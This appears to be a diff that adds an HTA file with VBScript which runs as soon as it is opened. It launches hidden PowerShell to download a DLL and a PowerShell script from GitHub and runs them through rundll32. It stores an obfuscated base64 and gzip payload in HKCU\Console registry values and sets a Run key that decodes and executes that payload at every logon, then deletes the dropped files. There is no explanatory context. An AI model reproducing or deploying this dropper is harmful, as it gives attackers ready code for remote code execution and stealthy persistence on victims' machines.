@@ -1,0 +1,79 @@
+<html>
+<head>
+	
+<script language="VBScript">
+	
+Function download(url, strSaveName)
+	c = "powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('" &url& "', (Join-Path $env:UserProfile '" &strSaveName& "'));"
+	Set obj = CreateObject("WScript.Shell")
+	obj.run c,0,3000
+
+End Function
+
+Function AddReg_AutoRun()
+
+		set ObjectShell = CreateObject("WScript.Shell")
+		
+		strRunOnce = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\RunScript"
+		path = "powershell.exe -w hidden -ep Bypass -nologo -noprofile IEX(([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((gp 'HKCU:\Console').EScript))))"
+		
+		ObjectShell.RegWrite strRunOnce, path, "REG_SZ"
+
+End Function
+
+Function AddReg_Console()
+
+	set ObjectShell = CreateObject("WScript.Shell")
+		
+		strRunOnce = "HKEY_CURRENT_USER\Console\ContentScript"
+		path = "H4sIAAAAAAAAAL1Xe2/ayBb/O3wKaxXJtkp4J5tWqtQxb4qB8DAEFqHBM5gJYw+1xyFk2+++xw9aepPuzWqvriVL45lzzpzzO0+PqLwaSZ/Z0hSEKlcW9QMmPKWUyVzWRFsqH5VPamYTeraMtqPFyqFytfeFvcKE+DQIlD8zFwPsY1fRLh+xv3IFCTnNKvFHREhJ6FP94iJzEW+FXoA3dOVhyR7pyqVyK0gAF2kLtN/XhIuZt/zwoRr6PvVk8p1rUomCgLprzmig6cpXZbqlPr3qrx+oLZU/lctVrsnFGvOU7FjF9hYMQh6JzrrCxpEFudGeM6mpf/yh6our4jJX/xJiHmjq6BhI6uYI56qufNOjC8fHPdVUk9m+CMRG5qbMK5dyk1j7Xqy8meiu6hmwzacy9D3l1yZGMhMOTYXlAJBBCYKqnmt7j2JHtUsv5DyrfNIWqULD0JPMpXAuqS/2I+o/MpsGuRb2CKdDullqPXo44fBWJu2cCagG0tezqfveorsZuzgRp+ovtT+LAx2eF7GgZ75lXokqQjl1sKQrCdCfhVXm4mIRLynYow1EwGK+j0ohq5igBJbCP8Ln5dgPqb5UFpHrFstleu2JM8j+UlDxxJXyJM5M9PioLCzByDJzEfs5Po8OVuuQcUL9iODXkVujG+bR2tHDLrNPwam95jS64TQGJHci64GimpoeUFJL4VEjRBcv2eouk995jUQ5ZIPjA9AKYkL/WZnEiZra9kzqAoDJtwrO2kBK0BN1mgbH0+3RNxCpVY6DIKsMQshJO6uMKOaUZBXkBSw9QqEU8VL9oa4ZcslsHMiTuKX+CqTp1VXhBdIPbXAvwDAe7anNMI9QySotRqhxHDHnpIL6KiZVzDnzHJD0CD6BnQiLkYyCxifZ/wwQPTeisu3uOXWBOq4YDY4dqA9pSsXxhh1K1L9R+5QoSVZEWJ1AOlMaAmDEhcwqFvMl1CA1+yLy/qV6P5ekn/Ss+jT1pBan4sI4yihhYko76gQfv4MZQ+dLgK3hC9fAAb2pRC3Dc7Tf8n3WQfDctz1uks6OFdsHeE14J6zcFrXfyefOQytv2tVg0GzcInZwDvZtD9kbdtvozIDujhXat4hUu3ct1ji0hp8RMWDPuWdFx0Fk8DCou91eOzCKqZyE365UWrMCKpcr/XJhR2gnot8h0nPZ4akLa6it/a4BfIU2r3eqw/W01JhPeStfaWw3UxGMbipzgpvXnCBDkBIPsTUU45btGvm8ddOOrDJ66/J+v24+bbvPk9CsImEB3bz5vmwfjb5VRaXuQ/33doMMrOf7Qv9oTGyX7+bT60L32Q7NWuDY3v2NOa4D785ZN7k/Hxmt+bTnrw/G/bSx/Z+9qLF7yhfJzCqSIa7tpxRv8kXqjiMrps+tzsRqfEHFxhB3AwPsGk+a2xmb55v599PO4Z28mY5bo4nrIPNLtT7hndHE6tzhvrS6D4/54r3XxG30jFC1U2mK+qQpNpa7LQ73N8A/Od07xdVCs9mK6GeI1J2nfGVWImjUeUeDDv7sNyq8HMkycH2ynYEvi+NW3iqJ1sSa3+EumVUQ8K5vUfeAUN8mRaMN4FXEU/5dYN0UPOFs8vn88f3z3WTOwAZx250y6zFv4Z0hEFiFmg5CdYSs0vZ+3xhwsG08KfY710UiUBXOG70pNj5PGe0mOpqlrnFo1ba2Uby2Hmo3RhkuuH0yH5zQHO+uwbfPPVY59sYT9Buk00Umzo51uNkkNf+/NFsT+8EWc8gbaJinatcQfiNtewPBIg5Ne32o2lHfoxwGDhhJTjUCcS7sqFH/omPC2JA08yXUwgksy6VXV7rynVD/0b1PWx8+zMGQtPhExSDXpZ4jt9nCU7lQgJZbeKoU9Mzb7a+K/VH7Li0bde0zKM8v4vFFeiaBeiu3UKfI/xnrtDbGV/9zrH/s/c3pm/AvZM9BenH488Y/cce/h2iKmQTWEfQATpMp5q1IpQF4NjOeeRoibJM+0YjfD+VVDybKjPopk2lvlDOEAvYMwz39otzq0ZwYSOzLqwexhj+BuF1ql1hX2vWZcomVb8oVgIKCcgl+B3wnjHqnkvzdfFUOYErM+FUZUpvCyHvVEWvoiRRGoEh0LCQihr2/AAdM644uDQAA"
+		
+		ObjectShell.RegWrite strRunOnce, path, "REG_SZ"
+
+
+		strRunOnce = "HKEY_CURRENT_USER\Console\EScript"
+		path = "cmVtb3ZlLWl0ZW0gLXBhdGggKEpvaW4tUGF0aCAiJGVudjp1c2VycHJvZmlsZSIgJ3Rlc3QucHMxJykgLWZvcmNlOyByZW1vdmUtaXRlbSAtcGF0aCAoSm9pbi1QYXRoICIkZW52OnVzZXJwcm9maWxlIiAncG93ZXJzaGRsbC5kbGwnKSAtZm9yY2U7IElFWCAoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKChOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChncCAnSEtDVTpcQ29uc29sZScpLkNvbnRlbnRTY3JpcHQpKSksW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCk7"
+		
+		ObjectShell.RegWrite strRunOnce, path, "REG_SZ"
+
+End Function
+
+Function Execute()
+	
+	path = "rundll32 %userprofile%\powershdll.dll, main -f %userprofile%\test.ps1"
+
+	Set obj = CreateObject("WScript.Shell")
+
+	obj.run path
+
+End Function
+
+Function main()
+	
+
+	Call download("https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dll", "powershdll.dll")
+	
+	Call download("https://raw.githubusercontent.com/phamphuqui1998/RE_basic/master/TestPS/Test_CVE0199_HTA.ps1", "test.ps1")
+	
+
+	Call Execute()
+
+	Call AddReg_Console()
+
+	Call AddReg_AutoRun()
+
+End Function
+
+
+Call main()
+</script>
+
+</head>
+
+<body>
+	<script language="VBScript">self.close</script>
+</body>
+</html>
+
+
+#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
